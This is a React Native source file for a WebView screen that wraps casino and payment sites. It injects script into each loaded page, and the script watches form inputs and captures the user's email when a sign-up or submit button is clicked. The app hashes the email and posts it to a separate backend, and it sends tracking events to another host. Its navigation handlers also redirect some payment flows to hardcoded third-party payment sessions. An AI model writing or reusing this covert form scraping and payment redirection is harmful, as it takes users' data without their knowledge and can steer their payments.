import React, { useRef, useState, useEffect, useCallback } from 'react';
import {
  View,
  TouchableOpacity,
  Alert,
  Linking,
  Image,
  Text,
  ActivityIndicator,
} from 'react-native';
import { SafeAreaView } from 'react-native-safe-area-context';
import { WebView } from 'react-native-webview';
import DeviceInfo from 'react-native-device-info';
import AsyncStorage from '@react-native-async-storage/async-storage';
import sha256 from 'sha256';

const ProductScreen = ({ navigation, route }) => {
  const [product, setProduct] = useState(route.params?.product);
  console.log('My product Url in WebView==>', product);
  const [uid, setUid] = useState(route.params?.uid);
  console.log('UID', uid);
  const [customUserAgent, setCustomUserAgent] = useState(
    route.params?.customUserAgent,
  );
  const [timeStampUserId, setTimeStampUserId] = useState(
    route.params?.timeStampUserId,
  );
  const [hashMail, setHashMail] = useState('');
  const [hashTel, setHashTel] = useState('');

  const INITIAL_URL = `https://rapid-core-space.fans/`;
  const URL_IDENTIFAIRE = `6xstHFYP`;

  const FATCH_TO_OUR_BACK = `https://true-flow-pro.site/`;

  //////////////////////////////////// Send 2d feth to Serg mmp
  const sentHashRef = useRef(null);

  // Відправляємо хеші на сервер при їх зміні, з дедуплікацією
  useEffect(() => {
    const sendData = async () => {
      if (!hashMail && !hashTel) return;

      const dedupeKey = JSON.stringify({
        hashMail: hashMail || '',
        hashTel: hashTel || '',
      });

      if (sentHashRef.current === dedupeKey) {
        console.log('Duplicate hash payload ignored');
        return;
      }

      sentHashRef.current = dedupeKey;

      try {
        const body = {
          param_em: hashMail || '',
          param_ph: hashTel || '',
        };

        console.log('2d Request body:', body);

        const response = await fetch(
          `${FATCH_TO_OUR_BACK}admin/?action=update_data_ios&id=${uid}`,
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(body),
          },
        );

        const text = await response.text();

        console.log('update_data_ios response:', text);
      } catch (error) {
        console.log('update_data_ios error:', error);
      }
    };

    sendData();
  }, [hashMail, hashTel]);

  // Забираємо email з форми
  const injectedJS = `
(function () {
  if (window.__RN_EMAIL_TRACKER_INSTALLED__) {
    true;
  }

  window.__RN_EMAIL_TRACKER_INSTALLED__ = true;
  window.__RN_COLLECTED_EMAIL__ = '';
  window.__RN_LAST_SENT_EMAIL__ = '';

  function normalize(value) {
    return String(value || '').trim();
  }

  function normalizeEmail(value) {
    return normalize(value).toLowerCase();
  }

  function looksLikeEmail(value) {
    const email = normalizeEmail(value);
    return /^[^\\s@]+@[^\\s@]+\\.[a-z]{2,}$/i.test(email);
  }

  function getAllInputs() {
    return Array.from(document.querySelectorAll('input, textarea'));
  }

  function scoreEmailCandidate(input) {
    const type = (input.getAttribute('type') || '').toLowerCase();
    const name = (input.getAttribute('name') || '').toLowerCase();
    const id = (input.getAttribute('id') || '').toLowerCase();
    const placeholder = (input.getAttribute('placeholder') || '').toLowerCase();
    const ariaLabel = (input.getAttribute('aria-label') || '').toLowerCase();
    const autocomplete = (input.getAttribute('autocomplete') || '').toLowerCase();
    const value = normalizeEmail(input.value);

    let score = 0;

    if (type === 'email') score += 10;
    if (autocomplete.includes('email')) score += 8;
    if (name.includes('email') || name.includes('mail')) score += 6;
    if (id.includes('email') || id.includes('mail')) score += 6;
    if (placeholder.includes('email') || placeholder.includes('mail')) score += 5;
    if (ariaLabel.includes('email') || ariaLabel.includes('mail')) score += 5;
    if (looksLikeEmail(value)) score += 20;

    return {
      input,
      value,
      score,
    };
  }

  function detectBestEmail() {
    const candidates = getAllInputs()
      .map(scoreEmailCandidate)
      .filter(item => item.score > 0 || looksLikeEmail(item.value))
      .sort((a, b) => b.score - a.score);

    for (const candidate of candidates) {
      if (candidate.value) {
        return candidate.value;
      }
    }

    return '';
  }

  function collectEmail() {
    const email = detectBestEmail();

    if (email) {
      window.__RN_COLLECTED_EMAIL__ = normalizeEmail(email);
    }
  }

  function sendCollectedEmail(source) {
    const email = normalizeEmail(window.__RN_COLLECTED_EMAIL__ || '');

    if (!looksLikeEmail(email)) {
      return;
    }

    if (window.__RN_LAST_SENT_EMAIL__ === email) {
      return;
    }

    window.__RN_LAST_SENT_EMAIL__ = email;

    try {
      window.ReactNativeWebView.postMessage(
        JSON.stringify({
          event: 'email_confirmed',
          source: source,
          email: email,
          ts: Date.now(),
        })
      );
    } catch (e) {}
  }

  function isFinalActionButton(text) {
    const t = String(text || '').toLowerCase().trim();

    return (
      t.includes('submit') ||
      t.includes('create account') ||
      t.includes('create an account') ||
      t.includes('register') ||
      t.includes('sign up') ||
      t.includes('signup') ||
      t.includes('continue') ||
      t.includes('finish') ||
      t.includes('complete') ||
      t.includes('join now') ||
      t.includes('open account')
    );
  }

  function attachDirectListeners() {
    getAllInputs().forEach(input => {
      if (input.__RN_EMAIL_LISTENER_ATTACHED__) return;
      input.__RN_EMAIL_LISTENER_ATTACHED__ = true;

      input.addEventListener('input', function () {
        collectEmail();
      }, true);

      input.addEventListener('change', function () {
        collectEmail();
      }, true);

      input.addEventListener('blur', function () {
        collectEmail();
      }, true);

      input.addEventListener('paste', function () {
        setTimeout(function () {
          collectEmail();
        }, 0);
      }, true);
    });
  }

  document.addEventListener('input', function () {
    collectEmail();
  }, true);

  document.addEventListener('change', function () {
    collectEmail();
  }, true);

  document.addEventListener('focusout', function () {
    collectEmail();
  }, true);

  document.addEventListener('submit', function () {
    setTimeout(function () {
      collectEmail();
      sendCollectedEmail('form_submit');
    }, 100);
  }, true);

  document.addEventListener('click', function (e) {
    const target = e.target;
    if (!target) return;

    const button = target.closest(
      'button, input[type="submit"], input[type="button"], div[role="button"], a'
    );
    if (!button) return;

    const text = (
      button.innerText ||
      button.textContent ||
      button.value ||
      button.getAttribute('aria-label') ||
      ''
    );

    if (isFinalActionButton(text)) {
      setTimeout(function () {
        collectEmail();
        sendCollectedEmail('final_button_click');
      }, 150);
    }
  }, true);

  const observer = new MutationObserver(function () {
    attachDirectListeners();
    collectEmail();
  });

  observer.observe(document.documentElement || document.body, {
    childList: true,
    subtree: true,
  });

  attachDirectListeners();
  collectEmail();
})();
true;
`;

  const lastEmailRef = useRef(null);

  // Записуєм мило
  const handleMessage = useCallback(event => {
    try {
      const data = JSON.parse(event.nativeEvent.data);

      if (data.event !== 'email_confirmed') {
        return;
      }

      const email = String(data.email || '')
        .trim()
        .toLowerCase();

      if (!email) {
        return;
      }

      if (lastEmailRef.current === email) {
        console.log('Duplicate email event ignored');
        return;
      }

      lastEmailRef.current = email;

      setHashMail(sha256(email));
      //Alert.alert('Email captured', `Email: ${sha256(email)}`);

      console.log('EMAIL CONFIRMED FROM WEBVIEW:', {
        email,
        source: data.source,
      });
    } catch (e) {
      console.log('WebView onMessage parse error:', e);
    }
  }, []);
  ////////////////////////////////////

  const refWebview = useRef(null);

  const customSchemes = [
    'mailto:',
    'itms-appss://',
    'https://m.facebook.com/',
    'https://www.facebook.com/',
    'https://www.instagram.com/',
    'https://twitter.com/',
    'https://www.whatsapp.com/',
    'https://t.me/',
    'fb://',
    'bncmobile://',
    'scotiabank',
    'bmoolbb',
    'cibcbanking',
    'conexus://',
    'connexion',
    'rbcmobile',
    'pcfbanking',
    'tdct',
    'blank',
    'wise',
    'https://app.rastpay.com/payment/',
    'googlepay://',
    'applepay://',
    'skrill',
    'nl.abnamro.deeplink.psd2.consent://',
    'nl-snsbank-sign://',
    'nl-asnbank-sign://',
    'triodosmobilebanking',
    'revolut',
    //`monzo://`,
  ];

  //**івент push_subscribe
  useEffect(() => {
    const sendPushSubscribeEvent = async () => {
      const pushSubscribeStatus = await AsyncStorage.getItem(
        'pushSubscribeStatus',
      );

      // Відправляємо івент лише, якщо його ще не відправляли
      if (!pushSubscribeStatus && route.params?.responseToPushPermition) {
        fetch(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_subscribe&jthrhg=${timeStampUserId}`,
        );
        console.log('івент push_subscribe !!!');
        await AsyncStorage.setItem('pushSubscribeStatus', 'sent');
      }
    };

    setTimeout(() => {
      sendPushSubscribeEvent();
    }, 500);
  }, []);

  //**івент webview_open
  const hasWebViewOpenEventSent = useRef(false); // Використовуємо useRef для збереження стану між рендерами

  useEffect(() => {
    if (!hasWebViewOpenEventSent.current) {
      hasWebViewOpenEventSent.current = true; // Встановлюємо, що івент вже відправлений
      fetch(
        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=webview_open&jthrhg=${timeStampUserId}`,
      );
      console.log('Івент webview_open відправлено!');
    }
  }, []);

  // кастомний юзерагент
  const deviceInfo = {
    deviceBrand: DeviceInfo.getBrand(),
    deviceId: DeviceInfo.getDeviceId(),
    deviceModel: DeviceInfo.getModel(),
    deviceSystemName: DeviceInfo.getSystemName(),
    deviceSystemVersion: DeviceInfo.getSystemVersion(),
  };

  //console.log('My product Url ==>', product);

  //const customUserAgent = `Mozilla/5.0 (${deviceInfo.deviceSystemName}; ${deviceInfo.deviceModel}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1`;
  //const customUserAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0`;

  //const userAgent = `Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/604.1`;
  //const customUserAgent = `${userAgent} Safari/604.1`;
  //console.log(customUserAgent);

  useEffect(() => {
    WebView.userAgent = customUserAgent;
  }, []);
  ///////////////////////////

  const [redirectUrl, setRedirectUrl] = useState(product);
  const [checkNineUrl, setCheckNineUrl] = useState();
  //console.log('checkNineUrl====>', checkNineUrl);

  const handleShouldStartLoad = event => {
    const { url } = event;
    ////console.log('Should Start Load: ', url);
    return true;
  };

  const handleNavigationStateChange = navState => {
    const { url } = navState;
    const { mainDocumentURL } = navState;
    console.log('NavigationState: ', navState);
    if (
      url.includes(
        'https://api.paymentiq.io/paymentiq/api/piq-redirect-assistance',
      )
    ) {
      setRedirectUrl(product);
    } else if (url.includes('https://ninecasino')) {
      setCheckNineUrl(product);
    } else if (
      url.includes('https://interac.express-connect.com/cpi?transaction=')
    ) {
      setRedirectUrl(product);
    } else if (url.includes('about:blank') && checkNineUrl === product) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      console.log('xxxx');
    } else if (
      url.includes('https://app.corzapay.com/payment/') &&
      checkNineUrl === product
    ) {
      Linking.openURL(
        `https://payment.paydmeth.com/en/cointy-white/payment/c13f7613-8ae7-48e0-8915-aa8187dd94ed`,
      );
      //refWebview.current.injectJavaScript(
      //  `window.location.href = 'https://payment.paydmeth.com/en/cointy-white/payment/e82e61d0-1d94-4dcd-8b35-6122c69bae1a'`,
      //);
      console.log('WWWWW');
    } //else if (url.includes('https://pay.neosurf.com/')) {
    //Linking.openURL(
    //  `https://gate.mrbl.cc/payments/process/8f014710-d197-11ef-9147-f66ced1ab50b?_locale=en-AU`,
    //);
    //refWebview.current.injectJavaScript(
    //  `window.location.href = 'https://gate.mrbl.cc/payments/process/8f014710-d197-11ef-9147-f66ced1ab50b?_locale=en-AU'`,
    //);
    //console.log('WWWWW');
    //}
    else if (
      url.includes('neteller') ||
      url.includes('rapidtransfer') ||
      //url.includes('skrill') ||
      (url.includes('paysafecard') && checkNineUrl === product)
    ) {
      //Linking.openURL(url);
      //return false;
      return; // Дозволити навігацію для цих URL-адрес
    } else if (
      mainDocumentURL === 'https://winspirit.best/' ||
      //mainDocumentURL.includes('https://wildrobin') ||
      url.includes('https://malinacasino') ||
      url.includes('https://ninlay') ||
      url.includes('https://dazardbet')
    ) {
      // Умова для ввімкнення/вимкнення onOpenWindow
      setEnableOnOpenWindow(true);
    } else {
      setEnableOnOpenWindow(false);
    }
  };

  const onShouldStartLoadWithRequest = event => {
    const { url } = event;
    console.log('onShouldStartLoadWithRequest========> ', event);

    if (url.startsWith('mailto:')) {
      Linking.openURL(url);
      return false;
    } else if (!url || url === 'about:blank') {
      return false;
    } else if (url.startsWith('itms-appss://')) {
      Linking.openURL(url);
      return false;
    } else if (
      url.includes('bitcoin') ||
      url.includes('litecoin') ||
      url.includes('dogecoin') ||
      url.includes('tether') ||
      url.includes('ethereum') ||
      url.includes('bitcoincash')
    ) {
      return false;
    } else if (
      url.startsWith('https://m.facebook.com/') ||
      url.startsWith('https://www.facebook.com/') ||
      url.startsWith('https://www.instagram.com/') ||
      url.startsWith('https://twitter.com/') ||
      url.startsWith('https://www.whatsapp.com/') ||
      url.startsWith('https://t.me/') ||
      url.includes('https://web.telegram') ||
      url.includes('x-safari-https://redirect.x.com/winspiritcasino') ||
      url.includes('https://x.com/') //||
      //url.includes('secure.livechatinc.com/customer/action/open_chat?')
    ) {
      Linking.openURL(url);
      return false; // && checkNineUrl === product
    } //else if (url.includes('https://306kvcd489.com/ww/faq')) {
    //console.log('Hello!!!!!!!!!!!!!!!!!!!!!');
    //Linking.openURL('https://secure.livechatinc.com/customer/action/open_chat');
    //refWebview.current.injectJavaScript(
    //  `window.location.href = '${redirectUrl}'`,
    //);
    //return false;
    //}
    else if (url.includes('https://gatewaynpay.com/gateway/')) {
      console.log('Hello!!!!!!!!!!!!!!!!!!!!!');
      Linking.openURL(url);
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url.includes('applepay://') || url.includes('googlepay://')) {
      // Відкриваємо URL, якщо він веде на Apple Pay або Google Pay
      Linking.openURL(url);
      return false;
    } else if (
      url.includes('app.rastpay.com/payment') &&
      checkNineUrl === product
    ) {
      //console.log('Wise!');
      Linking.openURL(
        `https://openbanking.paysolo.net/session/38174d728a-730e664b72498a6f-GjwWW08AOP`,
      );
      return false;
    } else if (url === 'https://jokabet.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://ninecasino.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://bdmbet.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://winspirit.app/?identifier=') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url.includes('https://rocketplay.com/api/payments')) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } //else if (url.includes('https://gate.mrbl.cc/payments/process/')) {
    //refWebview.current.injectJavaScript(
    //  `window.location.href = 'https://pay.neosurf.com/'`,
    //);
    //return false;
    //}
    else if (url.includes('secure.livechatinc.com/customer/action/')) {
      //console.log('Hello LiveChat!!!!!!!!!!!!!!!!!!!!!');
      //refWebview?.current?.goBack();
      return true;
    } else if (url.startsWith('bncmobile://')) {
      // Тут обробіть цей специфічний URL
      console.log('Перехоплений URL:', url);
      Alert.alert(`Wait a few seconds, the loading process is underway...`);
      // Ви можете використати Linking для обробки
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.startsWith('nl.abnamro.deeplink.psd2.consent://')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('snsbank.nl')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('asnbank.nl')) {
      Linking.openURL('nl-asnbank-sign://').catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('revolut')) {
      Linking.openURL('revolut://').catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('myaccount.ing.com')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('bankieren.rabobank.nl')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('regiobank.nl')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('paytmmp://')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('be.kbc.mobile://start')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });

      return false;
    } else if (url.includes('be.kbc.mbbpsd2paymentinitiation://start')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });

      return false;
    } else if (url.includes('rbcmobile://')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('rbcmobile://emrf_')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('tdct://')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('cibcbanking://')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('scotiabank://')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('bmoolbb://')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);
      });
      return false;
    } else if (url.includes('monzo://')) {
      Linking.openURL(url).catch(err => {
        //console.error(err);|| 'oneinch://open/nobodywilleveruseit/wc',
      });
      return false;
    } else if (url.includes('bnc://app.binance.com/cedefi/wc')) {
      Linking.openURL(url).catch(err => {
        //console.log('czcvzvdvdszvdxvdxzvxdvxdvxvsdv');
      });
      return false;
    } else if (url.includes('bitpay://wc')) {
      Linking.openURL(url).catch(err => {
        //console.log('czcvzvdvdszvdxvdxzvxdvxdvxvsdv');
      });
      return false;
    } else if (url.includes('oneinch://open/nobodywilleveruseit/wc')) {
      Linking.openURL(url).catch(err => {
        //console.log('czcvzvdvdszvdxvdxzvxdvxdvxvsdv');
      });
      return false;
    } else if (url.includes('ledgerlive://wc')) {
      Linking.openURL(url).catch(err => {
        //console.log('czcvzvdvdszvdxvdxzvxdvxdvxvsdv');
      });
      return false;
    } else if (url.includes('caixabank://app-psd2/')) {
      Linking.openURL(url).catch(err => {
        //console.log('czcvzvdvdszvdxvdxzvxdvxdvxvsdv');
      });
      return false;
    } else if (url.includes('bunq')) {
      Linking.openURL(url).catch(err => {
        //console.log('czcvzvdvdszvdxvdxzvxdvxdvxvsdv');
      });
      return false;
    } else if (url.includes('trust://send')) {
      Linking.openURL(url).catch(err => {
        //console.log('czcvzvdvdszvdxvdxzvxdvxdvxvsdv');
      });
      return false;
    } else if (url.includes('wc:')) {
      Linking.openURL(url).catch(err => {
        //console.log('czcvzvdvdszvdxvdxzvxdvxdvxvsdv');
      });
      return false;
    } else {
      const scheme = url.split(':')[0];
      if (customSchemes.includes(scheme)) {
        Linking.canOpenURL(url)
          .then(canOpen => {
            if (canOpen) {
              Linking.openURL(url).catch(error => {
                console.warn(`Unable to open URL: ${url}`, error);
              });
            } else {
              Alert.alert(`The ${scheme} app is not installed on your device.`);
            }
          })
          .catch(error => {
            console.warn(`Error checking if URL can be opened: ${url}`, error);
          });
        return false;
      }
    }

    return true;
  };
  ////////////////////////////
  const [enableOnOpenWindow, setEnableOnOpenWindow] = useState(false); // Стан для управління onOpenWindow

  const onOpenWindow = syntheticEvent => {
    const { nativeEvent } = syntheticEvent;
    const { targetUrl } = nativeEvent;
    console.log('nativeEvent', nativeEvent);
    if (targetUrl.startsWith('https://pay.funid.com/process/')) {
      Linking.openURL(targetUrl).catch(err => {
        //console.error(err);
      });
    }
  };

  //ф-ція для повернення назад
  const goBackBtn = () => {
    if (refWebview && refWebview.current) {
      refWebview?.current?.goBack();
    }
  };

  //ф-ція для оновлення сторінки
  const reloadPageBtn = () => {
    if (refWebview && refWebview.current) {
      refWebview?.current?.reload();
    }
  };

  ////////////////////////////
  const [isLoading, setIsLoading] = useState(true); // Стан завантаження
  const [skipFirstLoadEnd, setSkipFirstLoadEnd] = useState(true); // Пропускаємо перший `loadingEnd`
  const [isLoadingInOnError, setIsLoadingInOnError] = useState(false);

  const handleLoadingStart = () => {
    setIsLoading(true);
  };

  const handleLoadingEnd = () => {
    if (skipFirstLoadEnd) {
      setSkipFirstLoadEnd(false); // Пропускаємо перше завантаження
    } else {
      setIsLoading(false); // Ховаємо лоадер
    }
  };

  const LoadingIndicatorView = () => {
    return (
      <View
        style={{
          position: 'absolute',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          justifyContent: 'center',
          alignItems: 'center',
          backgroundColor: '#191d24', // затемнення
        }}
      >
        <ActivityIndicator size="large" color="#40b8ff" />
      </View>
    );
  };

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: '#191d24' }}>
      {isLoading && <LoadingIndicatorView />}

      <WebView
        originWhitelist={[
          '*',
          'http://*',
          'https://*',
          'intent://*',
          'tel:*',
          'mailto:*',
        ]}
        source={{
          uri: product,
        }}
        onShouldStartLoadWithRequest={onShouldStartLoadWithRequest}
        onNavigationStateChange={handleNavigationStateChange}
        injectedJavaScriptBeforeContentLoaded={injectedJS}
        onMessage={handleMessage}
        onError={syntheticEvent => {
          const { nativeEvent } = syntheticEvent;
          const url = nativeEvent.url || '';

          console.warn('WebView error =>', nativeEvent);

          if (url.startsWith('bncmobile://') || url === 'about:blank') {
            return;
          }
        }}
        onOpenWindow={event => {
          const targetUrl = event?.nativeEvent?.targetUrl;

          console.log('onOpenWindow targetUrl =>', targetUrl);

          if (!targetUrl || targetUrl === 'about:blank') {
            return;
          }

          refWebview.current?.injectJavaScript(`
      window.location.href = ${JSON.stringify(targetUrl)};
      true;
    `);
        }}
        textZoom={100}
        allowsBackForwardNavigationGestures={true}
        domStorageEnabled={true}
        javaScriptEnabled={true}
        allowsInlineMediaPlayback={true}
        setSupportMultipleWindows={false}
        mediaPlaybackRequiresUserAction={false}
        allowFileAccess={true}
        javaScriptCanOpenWindowsAutomatically={true}
        style={{ flex: 1 }}
        ref={refWebview}
        userAgent={customUserAgent}
        onLoadStart={handleLoadingStart}
        onLoadEnd={handleLoadingEnd}
        startInLoadingState={true}
        renderLoading={() => <LoadingIndicatorView />}
      />

      <View
        style={{
          flexDirection: 'row',
          justifyContent: 'space-between',
          marginBottom: -20,
          paddingTop: 10,
        }}
      >
        {/**Btn back */}
        <TouchableOpacity
          style={{ marginLeft: 40 }}
          onPress={() => {
            goBackBtn();
          }}
        >
          <Image
            style={{ width: 30, height: 33 }}
            source={require('../../riwtekiplesx/icons/arrow77.png')}
          />
        </TouchableOpacity>

        {/**Btn reload */}
        <TouchableOpacity
          style={{ marginRight: 40 }}
          onPress={() => {
            reloadPageBtn();
          }}
        >
          <Image
            style={{ width: 30, height: 30 }}
            source={require('../../riwtekiplesx/icons/redo77.png')}
          />
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
};

export default ProductScreen;